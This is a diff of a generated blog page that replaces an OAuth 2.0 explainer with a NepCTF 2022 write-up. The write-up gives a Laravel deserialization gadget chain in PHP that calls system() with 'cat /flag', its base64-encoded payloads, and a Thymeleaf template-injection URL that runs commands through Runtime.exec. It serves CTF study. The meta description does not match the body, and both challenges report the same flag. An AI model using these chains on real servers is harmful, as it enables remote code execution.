@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>OAuth 2.0 一种第三方授权访问机制 | hututu&#39;blog</title>
-  <meta name="keywords" content=" 协议 ">
-  <meta name="description" content="OAuth 2.0 一种第三方授权访问机制 | hututu&#39;blog">
+  <title>NepCTF-2022-WP | hututu&#39;blog</title>
+  <meta name="keywords" content=" ctf ">
+  <meta name="description" content="NepCTF-2022-WP | hututu&#39;blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="一共十道题，只做出来8道，剩下两道完全找不到漏洞点，等大佬wp @_@ 。这比赛的题目顺序有点迷，并没有按照难度排列，做的时候有点过山车的感觉，不过总体体验还是不错的。 secure-page直接看源码，只需要把cookie中的admin设为true即可。 1234567891011121314151617181920212223242526@server.get(&amp;#x27;&#x2F;&amp;#x27;)">
 <meta property="og:type" content="article">
@@ -371,9 +371,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-OAuth-2-0-一种第三方授权访问机制" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-NepCTF-2022-WP" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">OAuth 2.0 一种第三方授权访问机制</h1>
+        <h1 class="article-title">NepCTF-2022-WP</h1>
     
     <div class="article-meta">
         
@@ -383,7 +383,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="web笔记">web笔记</a>
+            <a  data-rel="CTF-Writeup">CTF-Writeup</a>
             
         </span>
         
@@ -391,14 +391,14 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color3">协议</a>
+            <a class="color4">ctf</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2022-05-07 01:55:26'>2022-05-07 01:51</time>
+            Created At : <time class="date" title='Updated At: 2022-07-28 00:59:26'>2022-07-20 00:50</time>
         
     </div>
     <div class="article-meta">
@@ -431,7 +431,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%8E%88%E6%9D%83%E6%96%B9%E5%BC%8F"><span class="toc-text">一、授权方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E6%8E%88%E6%9D%83%E7%A0%81"><span class="toc-text">（一）授权码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E9%9A%90%E8%97%8F%E5%BC%8F"><span class="toc-text">（二）隐藏式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%87%AD%E8%AF%81"><span class="toc-text">（三）客户端凭证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89%E5%AF%86%E7%A0%81%E5%BC%8F"><span class="toc-text">（四）密码式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E4%BB%A4%E7%89%8C%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-text">二、令牌的使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%80%90%E5%8F%82%E8%80%83%E3%80%91"><span class="toc-text">【参考】</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Just-Kidding"><span class="toc-text">Just Kidding</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenger"><span class="toc-text">Challenger</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -447,45 +447,42 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>简单来说，OAuth就是一种授权机制，它能够为第三方应用提供访问用户资源的授权。</p>
-<p>例如我们在玩某个游戏的时候需要获取QQ的好友列表，那么就需要遵循这个协议跟QQ服务器进行确认身份和协商，让游戏应用拿到允许获取QQ好友的一个令牌，然后游戏应用通过这个令牌就能够跟QQ服务器获取得到QQ好友列表。而这个令牌是有一个有效期的，过期就无法使用，这样就防止了令牌被滥用；当然这个令牌能获取到的数据也是有限的，他只能获取到你授权的内容，如果你只授权QQ好友的话，那么他是获取不到关于你QQ空间、QQ邮箱里面的内容的；而且当你不想玩这个游戏的时候还能够撤销这个令牌，让游戏无法再获取你的QQ好友列表。</p>
-<p>也就是说通过OAuth授权第三方应用得到的令牌就是一个临时访问特定资源的凭证，值得注意的是只要拿到了令牌系统就不会再进行身份认证了，因此令牌必须保密，防止泄露导致数据被非法访问。目前一般的流程为先备案再授权，系统只会向有在本系统进行备案的应用颁发令牌，这样可以在一定程度上防止令牌被滥用。</p>
-<h2 id="一、授权方式"><a href="#一、授权方式" class="headerlink" title="一、授权方式"></a>一、授权方式</h2><p>基于不同的场景，OAuth 2.0 有四种授权方式，分别为：</p>
-<blockquote>
-<ul>
-<li>授权码（authorization-code）</li>
-<li>隐藏式（implicit）</li>
-<li>客户端凭证（client credentials）</li>
-<li>密码式（password）</li>
-</ul>
-</blockquote>
-<p>假设网站b要向网站a获取访问用户C的数据的令牌，在网站a进行备案之后即可开始权限获取，下文将通过图示对四种授权方式进行描述：</p>
-<h3 id="（一）授权码"><a href="#（一）授权码" class="headerlink" title="（一）授权码"></a>（一）授权码</h3><p>最常用也是安全性最高的方式，一般授权码由前端获取，而令牌由后端获取，这样前后分离使得令牌不易泄露。</p>
-<img src="/2022/05/07/OAuth-2-0-%E4%B8%80%E7%A7%8D%E7%AC%AC%E4%B8%89%E6%96%B9%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%9C%BA%E5%88%B6/code.jpg" class="" title="This is an image">
+        <p>因为有其它的事情，只上线了一会，解了两个签到题就跑路了。</p>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Just-Kidding"><a href="#Just-Kidding" class="headerlink" title="Just Kidding"></a>Just Kidding</h2><p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11362">https://xz.aliyun.com/t/11362</a> 第一条链子。</p>
+<p>对照几处关键点都相符：</p>
+<p>\vendor\laravel\framework\src\Illuminate\Broadcasting\PendingBroadcast.php</p>
+<img src="/2022/07/20/NepCTF-2022-WP/image1.png" class="" title="This is an image">
+
+<p>\vendor\laravel\framework\src\Illuminate\Bus\Dispatcher.php</p>
+<img src="/2022/07/20/NepCTF-2022-WP/image2.png" class="" title="This is an image">
+
+<img src="/2022/07/20/NepCTF-2022-WP/image3.png" class="" title="This is an image">
+
+<p>可直接利用，poc如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace Illuminate\Contracts\Queue&#123;</span><br><span class="line"></span><br><span class="line">    interface ShouldQueue &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Illuminate\Bus&#123;</span><br><span class="line"></span><br><span class="line">    class Dispatcher&#123;</span><br><span class="line">        protected $container;</span><br><span class="line">        protected $pipeline;</span><br><span class="line">        protected $pipes = [];</span><br><span class="line">        protected $handlers = [];</span><br><span class="line">        protected $queueResolver;</span><br><span class="line">        function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;queueResolver = &quot;system&quot;;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Illuminate\Broadcasting&#123;</span><br><span class="line"></span><br><span class="line">    use Illuminate\Contracts\Queue\ShouldQueue;</span><br><span class="line"></span><br><span class="line">    class BroadcastEvent implements ShouldQueue &#123;</span><br><span class="line">        function __construct() &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class PendingBroadcast&#123;</span><br><span class="line">        protected $events;</span><br><span class="line">        protected $event;</span><br><span class="line">        function __construct() &#123;</span><br><span class="line">            $this-&gt;event = new BroadcastEvent();</span><br><span class="line">            $this-&gt;event-&gt;connection = &quot;cat /flag&quot;;</span><br><span class="line">            $this-&gt;events = new \Illuminate\Bus\Dispatcher();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line">    $pop = new \Illuminate\Broadcasting\PendingBroadcast();</span><br><span class="line">    echo base64_encode(serialize($pop));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
 
-<h3 id="（二）隐藏式"><a href="#（二）隐藏式" class="headerlink" title="（二）隐藏式"></a>（二）隐藏式</h3><p>适用于无后端的应用，安全性不高，只能用于对安全要求不高的场景，而且授权的令牌有效期一般较短。值得一提的是获取到令牌回调到原网站时，令牌存储位置采用的是锚点，由于oauth 2.0允许回调的网站是http的，因此存在中间人攻击的风险，但是采用锚点就有效减少了泄露的风险，毕竟浏览器跳转时锚点并不会发送到浏览器。</p>
-<img src="/2022/05/07/OAuth-2-0-%E4%B8%80%E7%A7%8D%E7%AC%AC%E4%B8%89%E6%96%B9%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%9C%BA%E5%88%B6/implicit.jpg" class="" title="This is an image">
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjU6e3M6MTI6IgAqAGNvbnRhaW5lciI7TjtzOjExOiIAKgBwaXBlbGluZSI7TjtzOjg6IgAqAHBpcGVzIjthOjA6e31zOjExOiIAKgBoYW5kbGVycyI7YTowOnt9czoxNjoiACoAcXVldWVSZXNvbHZlciI7czo2OiJzeXN0ZW0iO31zOjg6IgAqAGV2ZW50IjtPOjM4OiJJbGx1bWluYXRlXEJyb2FkY2FzdGluZ1xCcm9hZGNhc3RFdmVudCI6MTp7czoxMDoiY29ubmVjdGlvbiI7czo0OiJscyAvIjt9fQ==</span><br></pre></td></tr></table></figure>
 
+<img src="/2022/07/20/NepCTF-2022-WP/image4.jpg" class="" title="This is an image">
 
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjU6e3M6MTI6IgAqAGNvbnRhaW5lciI7TjtzOjExOiIAKgBwaXBlbGluZSI7TjtzOjg6IgAqAHBpcGVzIjthOjA6e31zOjExOiIAKgBoYW5kbGVycyI7YTowOnt9czoxNjoiACoAcXVldWVSZXNvbHZlciI7czo2OiJzeXN0ZW0iO31zOjg6IgAqAGV2ZW50IjtPOjM4OiJJbGx1bWluYXRlXEJyb2FkY2FzdGluZ1xCcm9hZGNhc3RFdmVudCI6MTp7czoxMDoiY29ubmVjdGlvbiI7czo5OiJjYXQgL2ZsYWciO319</span><br></pre></td></tr></table></figure>
 
+<img src="/2022/07/20/NepCTF-2022-WP/image5.jpg" class="" title="This is an image">
 
+<p><code>flag: NepCTF&#123;c2edd745-b451-4b64-a37e-bdd1942d5a7c&#125;</code></p>
+<h2 id="Challenger"><a href="#Challenger" class="headerlink" title="Challenger"></a>Challenger</h2><p>java Thymeleaf 模板注入，直接打就行</p>
+<img src="/2022/07/20/NepCTF-2022-WP/image6.png" class="" title="This is an image">
 
-<h3 id="（三）客户端凭证"><a href="#（三）客户端凭证" class="headerlink" title="（三）客户端凭证"></a>（三）客户端凭证</h3><p>适用于没有前端的命令行应用。</p>
-<img src="/2022/05/07/OAuth-2-0-%E4%B8%80%E7%A7%8D%E7%AC%AC%E4%B8%89%E6%96%B9%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%9C%BA%E5%88%B6/client_credentials.jpg" class="" title="This is an image">
+<p>payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/eval?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22cat%20flag%22).getInputStream()).next()%7d__::.x</span><br></pre></td></tr></table></figure>
 
+<img src="/2022/07/20/NepCTF-2022-WP/image7.png" class="" title="This is an image">
 
-
-<h3 id="（四）密码式"><a href="#（四）密码式" class="headerlink" title="（四）密码式"></a>（四）密码式</h3><p>这种方式一般是在其他方式都无法采用的情况下才会采用的，用户必须高度信任该应用，毕竟需要将用户名和密码交出来，存在的风险非常大。</p>
-<img src="/2022/05/07/OAuth-2-0-%E4%B8%80%E7%A7%8D%E7%AC%AC%E4%B8%89%E6%96%B9%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%9C%BA%E5%88%B6/password.jpg" class="" title="This is an image">
-
-
-
-<h2 id="二、令牌的使用"><a href="#二、令牌的使用" class="headerlink" title="二、令牌的使用"></a>二、令牌的使用</h2><p>网站b拿到了网站a的令牌之后，就可以向网站a提供的API发起请求获取数据了，令牌的位置一般是在数据包请求头，添加<code>Authorization: xxxxxxxx</code>键值对。当令牌过期时，OAuth 2.0允许用户自动更新令牌，注意到前面获取到的 <strong>JSON</strong> 数据中含有refresh_token字段，这就是用于获取新令牌的字段，用户在令牌过期前用refresh_token向网站a发送请求更新令牌即可，一般格式为<code>https://b.com/oauth/token?grant_type=refresh_token&amp;client_id=CLIENT_ID&amp;client_secret=CLIENT_SECRET&amp;refresh_token=REFRESH_TOKEN</code>。</p>
-<h2 id="【参考】"><a href="#【参考】" class="headerlink" title="【参考】"></a>【参考】</h2><p><a target="_blank" rel="noopener" href="https://www.ruanyifeng.com/blog/2019/04/oauth-grant-types.html">https://www.ruanyifeng.com/blog/2019/04/oauth-grant-types.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/html/rfc6749">https://datatracker.ietf.org/doc/html/rfc6749</a></p>
-<p><a target="_blank" rel="noopener" href="https://oauth.net/2/">https://oauth.net/2/</a></p>
+<p><code>flag: NepCTF&#123;c2edd745-b451-4b64-a37e-bdd1942d5a7c&#125;</code></p>
+<p><strong>一些相关的学习链接</strong></p>
+<p>Java安全之Thymeleaf 模板注入分析 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/16212784.html">https://www.cnblogs.com/nice0e3/p/16212784.html</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 hututu1024@126.com </span>
